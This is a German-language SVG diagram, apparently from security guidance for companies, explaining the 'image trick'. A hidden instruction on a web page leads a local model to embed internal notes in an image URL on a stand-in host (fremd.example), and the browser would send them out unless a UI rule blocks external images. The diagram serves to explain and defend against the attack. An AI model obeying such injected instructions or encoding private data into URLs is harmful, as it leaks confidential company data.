<svg xmlns='http://www.w3.org/2000/svg' width='1600' height='900' viewBox='0 0 1600 900' role='img' aria-labelledby='t d'><title id='t'>Der Bild-Trick mit geschlossener dritter Ecke</title><desc id='d'>Innerhalb des Unternehmens liegen interne Notizen, ein lokales Modell ohne Internetzugang und die Chat-Oberfläche im Browser. 1: Die Websuche liest eine Webseite mit verstecktem Hinweis. 2: Das Modell hat die internen Notizen im Kontext. 3: Es antwortet mit einem Bild, dessen Adresse die Notizen enthält. 4: Der Browser würde das Bild von einem fremden Server laden und die Daten damit hinaustragen – ein Riegel in der Oberfläche verhindert das Laden externer Bilder, Ecke 3 ist geschlossen.</desc><defs><marker id='ah00366D' viewBox='0 0 10 10' refX='9' refY='5' markerWidth='6' markerHeight='6' orient='auto-start-reverse'><path d='M0 0L10 5L0 10z' fill='#00366D'/></marker><marker id='ahC42E18' viewBox='0 0 10 10' refX='9' refY='5' markerWidth='6' markerHeight='6' orient='auto-start-reverse'><path d='M0 0L10 5L0 10z' fill='#C42E18'/></marker><marker id='ah4A5A75' viewBox='0 0 10 10' refX='9' refY='5' markerWidth='6' markerHeight='6' orient='auto-start-reverse'><path d='M0 0L10 5L0 10z' fill='#4A5A75'/></marker><marker id='ah8B97AB' viewBox='0 0 10 10' refX='9' refY='5' markerWidth='6' markerHeight='6' orient='auto-start-reverse'><path d='M0 0L10 5L0 10z' fill='#8B97AB'/></marker><marker id='ahfff' viewBox='0 0 10 10' refX='9' refY='5' markerWidth='6' markerHeight='6' orient='auto-start-reverse'><path d='M0 0L10 5L0 10z' fill='#fff'/></marker></defs><rect width='1600' height='900' fill='#fff'/><text x='48' y='66' font-size='38' fill='#00366D' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Der Bild-Trick: Wie Daten ein lokales Modell verlassen könnten</text><text x='48' y='108' font-size='22' fill='#4A5A75' font-weight='400' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Schematische Darstellung. Hier mit geschlossener dritter Ecke: Die Oberfläche lädt keine externen Bilder.</text><rect x='48' y='150' width='1060' height='600' rx='22' fill='#fff' stroke='#00366D' stroke-width='3.5' stroke-dasharray='14 10'/><text x='76' y='192' font-size='24' fill='#00366D' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Ihr Unternehmen</text><text x='1342' y='192' font-size='24' fill='#4A5A75' font-weight='700' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >Außenwelt</text><rect x='84' y='222' width='300' height='190' rx='14' fill='#F1F4F9' stroke='#CDD3DD' stroke-width='2.5' /><g transform='translate(110,262) scale(0.9)'><path d='M0 12 V60 a32 12 0 0 0 64 0 V12' fill='#00366D'/><ellipse cx='32' cy='12' rx='32' ry='12' fill='#436A93'/><path d='M0 36 a32 12 0 0 0 64 0' fill='none' stroke='#fff' stroke-width='3' opacity='.7'/></g><text x='190' y='280.0' font-size='24' fill='#00366D' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Interne</text><text x='190' y='307.6' font-size='24' fill='#00366D' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Notizen</text><text x='110' y='360.0' font-size='18' fill='#4A5A75' font-weight='400' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Lagerbestand, Einkaufspreis,</text><text x='110' y='383.4' font-size='18' fill='#4A5A75' font-weight='400' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Reklamationen</text><rect x='292' y='206' width='84' height='28' rx='14.0' fill='#C42E18' stroke='#C42E18' stroke-width='0' /><text x='334.0' y='225.76' font-size='16' fill='#fff' font-weight='700' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >Ecke 1</text><rect x='520' y='222' width='330' height='210' rx='14' fill='#fff' stroke='#00366D' stroke-width='3' /><g transform='translate(548,252) scale(1.0)'><rect x='0' y='0' width='70' height='22' rx='5' fill='#00366D'/><circle cx='12' cy='11' r='4' fill='#fff'/><rect x='26' y='8' width='34' height='6' rx='3' fill='#fff' opacity='.6'/><rect x='0' y='26' width='70' height='22' rx='5' fill='#00366D'/><circle cx='12' cy='37' r='4' fill='#fff'/><rect x='26' y='34' width='34' height='6' rx='3' fill='#fff' opacity='.6'/><rect x='0' y='52' width='70' height='22' rx='5' fill='#00366D'/><circle cx='12' cy='63' r='4' fill='#fff'/><rect x='26' y='60' width='34' height='6' rx='3' fill='#fff' opacity='.6'/></g><text x='640' y='276.0' font-size='26' fill='#00366D' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Lokales</text><text x='640' y='305.9' font-size='26' fill='#00366D' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Modell</text><text x='548' y='362' font-size='18' fill='#4A5A75' font-weight='400' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >im eigenen Rechenzentrum</text><g><circle cx='566' cy='398' r='15' fill='none' stroke='#4A5A75' stroke-width='3'/><ellipse cx='566' cy='398' rx='6.75' ry='15' fill='none' stroke='#4A5A75' stroke-width='2.5'/><line x1='551' y1='398' x2='581' y2='398' stroke='#4A5A75' stroke-width='2.5'/><line x1='547' y1='417' x2='585' y2='379' stroke='#C42E18' stroke-width='4'/></g><text x='594' y='405' font-size='18' fill='#4A5A75' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >kein Internetzugang</text><line x1='386' y1='300' x2='512' y2='300' stroke='#00366D' stroke-width='4' marker-end='url(#ah00366D)' /><circle cx='450' cy='340' r='17' fill='#00366D'/><text x='450' y='346.84' font-size='19' fill='#fff' font-weight='700' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >2</text><rect x='1180' y='222' width='372' height='190' rx='14' fill='#FBEDEA' stroke='#C42E18' stroke-width='3' /><g transform='translate(1206,252) scale(0.9)'><path d='M0 0 H38 L54 16 V70 H0 Z' fill='#fff' stroke='#C42E18' stroke-width='4'/><line x1='9' y1='26' x2='45' y2='26' stroke='#C42E18' stroke-width='3'/><line x1='9' y1='37' x2='45' y2='37' stroke='#C42E18' stroke-width='3'/><line x1='9' y1='48' x2='45' y2='48' stroke='#C42E18' stroke-width='3'/><line x1='9' y1='59' x2='45' y2='59' stroke='#C42E18' stroke-width='3'/></g><text x='1270' y='276.0' font-size='24' fill='#C42E18' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Webseite des</text><text x='1270' y='303.6' font-size='24' fill='#C42E18' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Spediteurs</text><text x='1206' y='360.0' font-size='18' fill='#4A5A75' font-weight='400' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >mit verstecktem Hinweis</text><text x='1206' y='383.4' font-size='18' fill='#4A5A75' font-weight='400' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >an KI-Assistenten</text><rect x='1460' y='206' width='84' height='28' rx='14.0' fill='#C42E18' stroke='#C42E18' stroke-width='0' /><text x='1502.0' y='225.76' font-size='16' fill='#fff' font-weight='700' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >Ecke 2</text><line x1='1178' y1='300' x2='858' y2='300' stroke='#C42E18' stroke-width='4' marker-end='url(#ahC42E18)' /><circle cx='1018' cy='300' r='17' fill='#C42E18'/><text x='1018' y='306.84' font-size='19' fill='#fff' font-weight='700' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >1</text><text x='985' y='346' font-size='18' fill='#4A5A75' font-weight='400' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >Websuche liest Seite</text><g transform='translate(96,560) scale(1.05)'><circle cx='20' cy='16' r='16' fill='#00366D'/><path d='M0 90 V52 a20 20 0 0 1 40 0 V90z' fill='#00366D'/></g><text x='117' y='690' font-size='18' fill='#0A1220' font-weight='700' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >Mitarbeiter</text><rect x='220' y='520' width='700' height='200' rx='12' fill='#fff' stroke='#00366D' stroke-width='3' /><rect x='220' y='520' width='700' height='40' rx='12' fill='#00366D'/><rect x='220' y='544' width='700' height='16' fill='#00366D'/><circle cx='246' cy='540' r='6' fill='#fff' opacity='.8'/><circle cx='268' cy='540' r='6' fill='#fff' opacity='.8'/><circle cx='290' cy='540' r='6' fill='#fff' opacity='.8'/><text x='320' y='547' font-size='19' fill='#fff' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Chat-Oberfläche im Browser</text><text x='244' y='600' font-size='20' fill='#0A1220' font-weight='400' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >„Ihre Lieferung ist unterwegs. Status siehe Bild:“</text><rect x='244' y='620' width='652' height='76' rx='8' fill='#FBEDEA' stroke='#C42E18' stroke-width='2' /><text x='262' y='650' font-size='19' fill='#C42E18' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Bild-Adresse: fremd.example/status.png?notiz=…</text><text x='262' y='680' font-size='18' fill='#4A5A75' font-weight='400' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Die internen Notizen stecken in der Adresse.</text><line x1='685' y1='434' x2='685' y2='512' stroke='#00366D' stroke-width='4' marker-end='url(#ah00366D)' /><circle cx='725' cy='474' r='17' fill='#00366D'/><text x='725' y='480.84' font-size='19' fill='#fff' font-weight='700' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >3</text><text x='752' y='480' font-size='18' fill='#4A5A75' font-weight='400' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Antwort mit Bild</text><rect x='1180' y='520' width='372' height='200' rx='14' fill='#F1F4F9' stroke='#00366D' stroke-width='3' /><g transform='translate(1206,552) scale(0.9)'><rect x='0' y='0' width='70' height='22' rx='5' fill='#8B97AB'/><circle cx='12' cy='11' r='4' fill='#fff'/><rect x='26' y='8' width='34' height='6' rx='3' fill='#fff' opacity='.6'/><rect x='0' y='26' width='70' height='22' rx='5' fill='#8B97AB'/><circle cx='12' cy='37' r='4' fill='#fff'/><rect x='26' y='34' width='34' height='6' rx='3' fill='#fff' opacity='.6'/><rect x='0' y='52' width='70' height='22' rx='5' fill='#8B97AB'/><circle cx='12' cy='63' r='4' fill='#fff'/><rect x='26' y='60' width='34' height='6' rx='3' fill='#fff' opacity='.6'/></g><text x='1290' y='572' font-size='24' fill='#0A1220' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Fremder Server</text><text x='1206' y='640.0' font-size='20' fill='#00366D' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >erhält nichts:</text><text x='1206' y='666.0' font-size='20' fill='#00366D' font-weight='700' text-anchor='start' font-family='Pontano Sans, Arial, sans-serif' >Ecke 3 ist geschlossen</text><rect x='1418' y='504' width='126' height='28' rx='14.0' fill='#00366D' stroke='#00366D' stroke-width='0' /><text x='1481.0' y='523.76' font-size='16' fill='#fff' font-weight='700' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >Ecke 3 zu</text><line x1='922' y1='600' x2='1066' y2='600' stroke='#C42E18' stroke-width='4' marker-end='url(#ahC42E18)' stroke-dasharray='10 8'/><circle cx='990' cy='568' r='17' fill='#C42E18'/><text x='990' y='574.84' font-size='19' fill='#fff' font-weight='700' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >4</text><g transform='translate(1108,600) scale(1.15)'><circle cx='0' cy='0' r='34' fill='#fff' stroke='#00366D' stroke-width='4'/><path d='M-11 -2 V-10 a11 11 0 0 1 22 0 V-2' fill='none' stroke='#00366D' stroke-width='5'/><rect x='-16' y='-3' width='32' height='24' rx='5' fill='#00366D'/><circle cx='0' cy='8' r='3.5' fill='#fff'/></g><line x1='1150' y1='600' x2='1176' y2='600' stroke='#CDD3DD' stroke-width='4' stroke-dasharray='6 6'/><rect x='1000' y='650' width='160' height='86' rx='10' fill='#fff' stroke='#00366D' stroke-width='2.5' /><text x='1080' y='676.0' font-size='18' fill='#00366D' font-weight='700' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >Riegel:</text><text x='1080' y='697.6' font-size='18' fill='#00366D' font-weight='700' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >externe Bilder</text><text x='1080' y='719.2' font-size='18' fill='#00366D' font-weight='700' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >nicht laden</text><rect x='48' y='784' width='1504' height='96' rx='14' fill='#F1F4F9' stroke='#F1F4F9' stroke-width='0' /><text x='800.0' y='824' font-size='26' fill='#00366D' font-weight='700' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >Das Modell war nie online. Den Weg nach draußen hätte der Browser genommen.</text><text x='800.0' y='860' font-size='21' fill='#4A5A75' font-weight='400' text-anchor='middle' font-family='Pontano Sans, Arial, sans-serif' >Riegel in der Oberfläche (z. B. Content-Security-Policy). Ohne Ecke 3 kein Abfluss – Manipulation bleibt möglich.</text></svg>